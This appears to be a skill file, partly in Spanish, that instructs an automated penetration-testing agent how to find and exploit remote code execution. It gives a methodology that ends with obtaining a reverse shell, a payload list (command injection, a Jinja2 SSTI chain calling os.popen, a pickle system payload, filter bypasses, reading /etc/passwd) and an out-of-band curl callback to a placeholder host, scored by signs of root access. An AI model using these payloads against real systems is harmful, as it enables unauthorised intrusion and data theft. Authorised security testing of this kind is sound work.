# SKILL: REMOTE CODE EXECUTION (RCE)

<!-- critical -->
RCE es la vulnerabilidad más crítica, ya que permite al atacante ejecutar comandos arbitrarios en el servidor. Esto suele llevar al control total del sistema, robo de datos y movimiento lateral en la red.
<!-- /critical -->

## 1. SCOPE - Dónde Buscar

<!-- scope -->
- **Parámetros que pasan a shell**: ip=, host=, file=, cmd=, dir=
- **Sube de archivos**: Shells en PHP, JSP, ASPX, Python.
- **Deserialización**: Datos serializados en cookies o parámetros (Java, PHP, Python pickle).
- **Template Engines**: Identificadores de plantillas (`{{...}}`, `${...}`) en parámetros.
- **Headers**: User-Agent (si se pasa a un script de análisis inseguro).
<!-- /scope -->

## 2. METHODOLOGY

<!-- methodology -->
1. **IDENTIFY**: Intentar inyectar comandos de sistema o expresiones de plantilla.
2. **HEURISTIC**: Usar comandos de tiempo (`sleep`, `ping`) o callbacks OOB (`curl`, `nslookup`).
3. **CONTEXT**: Determinar si es Command Injection (OS), SSTI (Template) o Deserialización.
4. **EXPLOIT**: Ejecutar comandos para confirmar identidad (`whoami`, `id`) y leer archivos.
5. **SHELL**: Intentar obtener una Reverse Shell para acceso interactivo.
<!-- /methodology -->

## 3. KNOWLEDGE BASE

<!-- knowledge -->

### Command Injection (OS)

- **Linux**: `; sleep 5`, `&& id`, `|| whoami`, `| uname -a`
- **Windows**: `& timeout 5`, `&& whoami`, `|| dir`

### Server-Side Template Injection (SSTI)

- **Jinja2 (Python)**: `{{7*7}}` -> 49, `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Smarty (PHP)**: `{php}echo "id";{/php}`
- **Java (Spring)**: `${7*7}`

### Insecure Deserialization

- **PHP**: `O:4:"User":...`
- **Java**: Hex starts with `AC ED 00 05`
- **Python**: `cos\nsystem\n(S'id'\ntR.` (Pickle)

### Bypasses

- **Space Filter**: Use `${IFS}`, `%20`, `<` (bash redirection).
- **Keyword Filter**: `w'h'o'a'm'i`, `\w\h\o\a\m\i`, `who$(empty)ami`.
- **Character Filter**: Inyectar vía variables de entorno (`$PATH`, `$HOME`).

<!-- /knowledge -->

## 4. SCORING GUIDE

<!-- scoring_guide -->

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | **CONFIRMED** - Ejecución de comando exitosa | Output de `id` o `whoami` visible, o callback OOB recibido |
| **7-8** | **HIGH** - DNS/HTTP callback recibido o timing confirmado | Conexión a Interactsh tras comando `curl` o delay de 5s |
| **5-6** | **MEDIUM** - Error del motor (Template/Shell) | `Syntax error: unexpected '&&'` o `Template syntax error` |
| **3-4** | **LOW** - Parámetro parece llegar a un sink crítico | `target=127.0.0.1` reacciona diferente a caracteres especiales |
| **0-2** | **REJECT** - Falso positivo claro | El input se muestra como texto sin ser procesado |

**AUTO-SCORING KEYWORDS:**

- 9-10: "uid=0(root)", "Administrator", "HTTP callback received", "DNS exfiltration"
- 7-8: "Connection timed out", "Command not found", "Template error"
- 5-6: "internal server error" (si ocurre solo con payloads de RCE)
- 0-2: "EXPECTED: SAFE", "sanitized", "display only"

<!-- /scoring_guide -->

## 5. FALSE POSITIVES

<!-- false_positives -->

**RECHAZAR INMEDIATAMENTE:**

1. El comando se refleja tal cual sin ser ejecutado (E.g., ves `; sleep 5` en el HTML).
2. El error de "comando no encontrado" ocurre en el browser/cliente.
3. El delay detectado es inconsistente o falso.
4. "EXPECTED: SAFE" marcado explícitamente.

**NO SON FALSOS POSITIVOS:**

- Errores de permisos (`sh: 1: /etc/shadow: Permission denied`). (Confirma ejecución).
- Errores de sintaxis de un motor de plantillas (Confirma SSTI).
- El servidor bloquea el comando pero permite otros (Indica filtrado parcial).

<!-- /false_positives -->

## 6. PAYLOADS

<!-- payloads -->

### HIGH VALUE (OS Command)

```bash
;whoami
|id
&&curl http://[OOB_URL]/rce
$(sleep 5)
`id`
```

### MEDIUM VALUE (SSTI)

```python
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
```

### BYPASS (Spaces & Keywords)

```bash
;whoami${IFS}
;cat</etc/passwd
;w'h'o'a'm'i
```

<!-- /payloads -->

## 7. PRO TIPS

<!-- pro_tips -->
1. **Try OOB first**: Muchos RCE son "blind". Usa `curl`, `nslookup` o `ping` hacia tu servidor OOB.
2. **Enviroment Variables**: Lee `$PATH` o env variables para entender el sistema antes de lanzar una shell.
3. **Escaping**: Asegúrate de cerrar correctamente la comilla o el paréntesis del código legítimo antes de tu comando.
<!-- /pro_tips -->
